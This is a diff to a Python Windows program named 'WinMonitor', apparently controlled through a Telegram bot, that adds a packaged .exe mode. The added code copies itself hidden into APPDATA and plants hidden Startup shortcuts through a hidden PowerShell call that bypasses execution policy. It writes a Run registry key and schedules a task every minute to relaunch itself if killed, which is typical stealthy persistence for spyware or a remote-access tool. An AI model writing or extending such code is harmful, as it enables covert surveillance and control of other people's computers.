@@ -54,6 +54,7 @@ DEFAULT_CHAT_ID   = "PUT_YOUR_CHAT_ID_HERE"   # vi du: "123456789"
 
 # ----------------------------------------------------------------------------
 IS_WINDOWS = (os.name == "nt")
+IS_FROZEN  = bool(getattr(sys, "frozen", False))
 APP_NAME   = "WinMonitor"
 APP_VER    = "1.0.0"
 
@@ -61,9 +62,16 @@ APPDATA  = os.environ.get("APPDATA") or os.path.expanduser("~")
 BASE_DIR = os.path.join(APPDATA, APP_NAME)
 CONFIG_PATH = os.path.join(BASE_DIR, "config.json")
 LOG_PATH    = os.path.join(BASE_DIR, "monitor.log")
-SELF_COPY   = os.path.join(BASE_DIR, ".win_monitor.pyw")
+SELF_COPY   = os.path.join(BASE_DIR, ".win_monitor.pyw")   # chi dung khi chay bang Python
+DEPLOY_EXE  = os.path.join(BASE_DIR, "WinMonitor.exe")    # ban .exe trien khai
+LAUNCHER    = os.path.join(BASE_DIR, "WinMonitor.lnk")     # shortcut khoi dong (tro toi .exe hoac .pyw)
 STARTUP_DIR = os.path.join(APPDATA, r"Microsoft\Windows\Start Menu\Programs\Startup")
 STARTUP_COPY = os.path.join(STARTUP_DIR, ".win_monitor.pyw")
+STARTUP_LNK  = os.path.join(STARTUP_DIR, "WinMonitor.lnk")
+
+# Cho phep cau hinh san khi build .exe: tao file nay canh .exe de tu nap luc chay dau.
+BOOTSTRAP_CONFIG = os.path.join(os.path.dirname(os.path.abspath(sys.argv[0] or __file__)),
+                                "winmonitor.config.json")
 
 RUNNING = True
 CONFIG_LOCK = threading.RLock()
@@ -126,9 +134,15 @@ DEFAULT_CONFIG = {
 def load_config():
     global CFG
     cfg = dict(DEFAULT_CONFIG)
+    source = None
     if os.path.exists(CONFIG_PATH):
+        source = CONFIG_PATH
+    elif os.path.exists(BOOTSTRAP_CONFIG):
+        # Nap cau hinh dong goi san (vd: tu file canh .exe khi build)
+        source = BOOTSTRAP_CONFIG
+    if source:
         try:
-            with open(CONFIG_PATH, "r", encoding="utf-8") as f:
+            with open(source, "r", encoding="utf-8") as f:
                 saved = json.load(f)
             if isinstance(saved, dict):
                 cfg.update(saved)
@@ -616,6 +630,9 @@ def copy_hidden(src, dst):
 
 
 def find_pythonw():
+    if IS_FROZEN:
+        # Ban .exe: chinh no la trinh chay (khong can Python)
+        return sys.executable
     exe = sys.executable or "pythonw.exe"
     base = os.path.basename(exe).lower()
     if base == "python.exe":
@@ -628,6 +645,45 @@ def find_pythonw():
     return w or exe
 
 
+def _deploy_src():
+    """Duong dan file goc de trien khai: .exe neu dang chay dang .exe, nguoc lai la .pyw."""
+    if IS_FROZEN:
+        return os.path.abspath(sys.executable)
+    return os.path.abspath(sys.argv[0]) if sys.argv and sys.argv[0] else os.path.abspath(__file__)
+
+
+def launcher_target():
+    """File ma shortcut/Registry/Scheduled Task se goi toi."""
+    if IS_FROZEN:
+        return DEPLOY_EXE
+    return SELF_COPY
+
+
+def create_shortcut(lnk_path, target, arguments="", workdir=None):
+    """Tao shortcut .lnk bang PowerShell (khong can pywin32)."""
+    workdir = workdir or os.path.dirname(target)
+    ps = (
+        "$W=New-Object -ComObject WScript.Shell;"
+        "$S=$W.CreateShortcut('%s');"
+        "$S.TargetPath='%s';"
+        "$S.Arguments='%s';"
+        "$S.WorkingDirectory='%s';"
+        "$S.WindowStyle=7;"
+        "$S.Save()"
+    ) % (lnk_path.replace("'", "''"), target.replace("'", "''"),
+         arguments.replace("'", "''"), workdir.replace("'", "''"))
+    try:
+        subprocess.run(
+            ["powershell", "-NoProfile", "-NonInteractive", "-ExecutionPolicy", "Bypass",
+             "-WindowStyle", "Hidden", "-Command", ps],
+            capture_output=True, timeout=30,
+            creationflags=getattr(subprocess, "CREATE_NO_WINDOW", 0))
+        return os.path.exists(lnk_path)
+    except Exception as e:
+        log("create_shortcut error: %s" % e)
+        return False
+
+
 def _run_hidden(cmd):
     try:
         subprocess.run(cmd, capture_output=True, timeout=30,
@@ -637,8 +693,8 @@ def _run_hidden(cmd):
 
 
 def register_scheduled_tasks():
-    pythonw = find_pythonw()
-    tr = '"%s" "%s"' % (pythonw, SELF_COPY)
+    target = launcher_target()
+    tr = '"%s"' % target
     # task 1: moi 1 phut (tu phuc hoi neu bi kill)
     _run_hidden(['schtasks', '/Create', '/TN', 'WinMonitorGuard',
                  '/TR', tr, '/SC', 'MINUTE', '/MO', '1', '/F'])
@@ -650,8 +706,7 @@ def register_scheduled_tasks():
 def register_run_key():
     try:
         import winreg
-        pythonw = find_pythonw()
-        val = '"%s" "%s"' % (pythonw, SELF_COPY)
+        val = '"%s"' % launcher_target()
         key = winreg.OpenKey(winreg.HKEY_CURRENT_USER,
                              r"Software\Microsoft\Windows\CurrentVersion\Run",
                              0, winreg.KEY_SET_VALUE)
@@ -666,19 +721,33 @@ def ensure_persistence():
         return
     try:
         os.makedirs(BASE_DIR, exist_ok=True)
-        src = os.path.abspath(sys.argv[0]) if sys.argv and sys.argv[0] else __file__
-        # An chinh file dang chay (neu co the)
-        hide_file(src)
-        # ban sao chuan trong APPDATA (an)
-        if os.path.abspath(SELF_COPY) != os.path.abspath(src):
-            copy_hidden(src, SELF_COPY)
-        # ban sao trong Startup (an)
-        try:
-            os.makedirs(STARTUP_DIR, exist_ok=True)
-            if os.path.abspath(STARTUP_COPY) not in (os.path.abspath(src), os.path.abspath(SELF_COPY)):
-                copy_hidden(SELF_COPY if os.path.exists(SELF_COPY) else src, STARTUP_COPY)
-        except Exception:
-            pass
+        src = _deploy_src()
+        if IS_FROZEN:
+            # Ban .exe: copy .exe vao APPDATA (an) + tao shortcut khoi dong
+            if os.path.abspath(DEPLOY_EXE) != os.path.abspath(src):
+                copy_hidden(src, DEPLOY_EXE)
+            else:
+                hide_file(DEPLOY_EXE)
+            if not os.path.exists(LAUNCHER):
+                create_shortcut(LAUNCHER, DEPLOY_EXE)
+            hide_file(LAUNCHER)
+            try:
+                os.makedirs(STARTUP_DIR, exist_ok=True)
+                create_shortcut(STARTUP_LNK, DEPLOY_EXE)
+                hide_file(STARTUP_LNK)
+            except Exception:
+                pass
+        else:
+            # Ban .pyw: copy script (an) vao APPDATA + Startup
+            hide_file(src)
+            if os.path.abspath(SELF_COPY) != os.path.abspath(src):
+                copy_hidden(src, SELF_COPY)
+            try:
+                os.makedirs(STARTUP_DIR, exist_ok=True)
+                if os.path.abspath(STARTUP_COPY) not in (os.path.abspath(src), os.path.abspath(SELF_COPY)):
+                    copy_hidden(SELF_COPY if os.path.exists(SELF_COPY) else src, STARTUP_COPY)
+            except Exception:
+                pass
         register_run_key()
         register_scheduled_tasks()
     except Exception as e:
@@ -712,16 +781,17 @@ def remove_persistence():
         winreg.CloseKey(key)
     except Exception:
         pass
-    for p in (STARTUP_COPY, SELF_COPY):
+    for p in (STARTUP_COPY, SELF_COPY, DEPLOY_EXE, LAUNCHER, STARTUP_LNK):
         try:
             if os.path.abspath(p) != os.path.abspath(sys.argv[0]):
                 os.remove(p)
         except Exception:
             pass
-    # xoa file dang chay khi reboot
+    # Xoa file dang chay khi reboot (tranh truong hop file dang bi khoa)
     try:
         MOVEFILE_DELAY_UNTIL_REBOOT = 0x4
-        ctypes.windll.kernel32.MoveFileExW(sys.argv[0], None, MOVEFILE_DELAY_UNTIL_REBOOT)
+        ctypes.windll.kernel32.MoveFileExW(sys.executable if IS_FROZEN else sys.argv[0],
+                                            None, MOVEFILE_DELAY_UNTIL_REBOOT)
     except Exception:
         pass
 
@@ -1116,19 +1186,38 @@ def main():
 
     load_config()
 
-    # Cau hinh nhanh qua tham so dong lenh (tien khi cai dat lan dau):
-    #   win_monitor.pyw --token 123:ABC --chat 987654321
-    _argv = sys.argv[1:]
-    if "--token" in _argv:
+    # Cau hinh nhanh qua tham so dong lenh (tien khi cai dat / build .exe):
+    #   WinMonitor.exe --token 123:ABC --chat 987654321
+    #   WinMonitor.exe --config C:\duong\dan\config.json
+    def _arg(name):
+        a = sys.argv[1:]
+        if name in a:
+            try:
+                return a[a.index(name) + 1]
+            except Exception:
+                return None
+        for x in a:
+            if x.startswith(name + "="):
+                return x[len(name) + 1:]
+        return None
+
+    _cfgfile = _arg("--config")
+    if _cfgfile and os.path.exists(_cfgfile):
         try:
-            cfg_set("bot_token", _argv[_argv.index("--token") + 1])
-        except Exception:
-            pass
-    if "--chat" in _argv:
-        try:
-            cfg_set("chat_id", _argv[_argv.index("--chat") + 1])
-        except Exception:
-            pass
+            with open(_cfgfile, "r", encoding="utf-8") as f:
+                _loaded = json.load(f)
+            if isinstance(_loaded, dict):
+                for _k in DEFAULT_CONFIG:
+                    if _k in _loaded:
+                        cfg_set(_k, _loaded[_k])
+        except Exception as e:
+            log("load --config error: %s" % e)
+    _tok = _arg("--token")
+    if _tok:
+        cfg_set("bot_token", _tok)
+    _chat = _arg("--chat")
+    if _chat:
+        cfg_set("chat_id", _chat)
 
     token = str(cfg_get("bot_token", ""))
     if not token or "PUT_YOUR" in token:
